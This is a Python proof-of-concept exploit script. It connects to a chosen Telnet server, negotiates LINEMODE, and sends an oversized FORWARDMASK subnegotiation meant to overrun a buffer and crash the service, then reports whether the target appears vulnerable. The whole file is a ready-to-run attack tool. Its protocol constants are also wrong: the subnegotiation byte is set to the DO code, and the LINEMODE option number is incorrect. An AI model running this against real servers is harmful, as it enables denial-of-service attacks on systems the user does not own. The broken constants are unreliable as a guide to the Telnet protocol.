#!/usr/bin/env python3
import socket
import sys
import struct

# Telnet Command Constants
TELNET_IAC = 0xFF
TELNET_SB = 0xFD
TELNET_SE = 0xF0
TELNET_WILL = 0xFB
TELNET_WONT = 0xFC
TELNET_DO = 0xFD
TELNET_DONT = 0xFE

# LINEMODE Constants (RFC 1184)
LINEMODE = 37
LINEMODE_MODE = 1
LINEMODE_FORWARDMASK = 2
LINEMODE_STATE = 3
LINEMODE_EDIT = 0
LINEMODE_SEND = 1

# Buffer size limit for FORWARDMASK in RFC 1184 is 20 bytes.
# We send significantly more to trigger a buffer overrun.
OVERFLOW_SIZE = 1024

def send_telnet_command(sock, cmd, opt):
    """Send a Telnet command byte sequence."""
    sock.sendall(bytes([TELNET_IAC, cmd, opt]))

def negotiate_linemode(sock):
    """Negotiate LINEMODE option with the server."""
    print("[*] Negotiating LINEMODE...")
    # Client sends WILL LINEMODE
    send_telnet_command(sock, TELNET_WILL, LINEMODE)
    
    # Read server response
    data = sock.recv(1024)
    if not data:
        print("[-] Connection closed during negotiation.")
        return False
    
    # Check if server accepts (DO LINEMODE) or rejects (DONT LINEMODE)
    if bytes([TELNET_IAC, TELNET_DO, LINEMODE]) in data:
        print("[+] Server accepted LINEMODE.")
        return True
    elif bytes([TELNET_IAC, TELNET_DONT, LINEMODE]) in data:
        print("[-] Server rejected LINEMODE.")
        return False
    else:
        print("[?] Unexpected response during negotiation.")
        return False

def send_forwardmask_overflow(sock, mask_size):
    """Send a FORWARDMASK subnegotiation with an oversized mask."""
    print(f"[*] Sending FORWARDMASK with {mask_size} bytes (RFC limit: 20)...")
    
    # Craft the FORWARDMASK subnegotiation
    # Format: IAC SB LINEMODE FORWARDMASK <mask_bytes> SE
    mask_bytes = b'A' * mask_size  # Oversized mask data
    
    payload = bytes([TELNET_IAC, TELNET_SB, LINEMODE, LINEMODE_FORWARDMASK])
    payload += mask_bytes
    payload += bytes([TELNET_IAC, TELNET_SE])
    
    sock.sendall(payload)
    print("[+] Overflow payload sent.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_forwardmask_buffer_overrun.py <target_ip> [target_port]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 23
    
    try:
        # Step 1: Connect to the Telnet server
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print("[+] Connected.")
        
        # Step 2: Negotiate LINEMODE
        if not negotiate_linemode(sock):
            print("[-] LINEMODE negotiation failed. Target may not be vulnerable.")
            sock.close()
            sys.exit(1)
        
        # Step 3: Send oversized FORWARDMASK to trigger buffer overflow
        send_forwardmask_overflow(sock, OVERFLOW_SIZE)
        
        # Step 4: Observe outcome
        print("[*] Waiting for response or crash...")
        try:
            data = sock.recv(1024)
            if data:
                print(f"[+] Received response: {data.hex()}")
                print("[!] Target may have handled the overflow gracefully (patched).")
            else:
                print("[!] Connection closed unexpectedly. Possible crash (vulnerable).")
        except socket.timeout:
            print("[!] Connection timed out. Possible hang or crash (vulnerable).")
        except ConnectionResetError:
            print("[!] Connection reset. Possible crash (vulnerable).")
        
        sock.close()
        print("[*] Test complete.")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()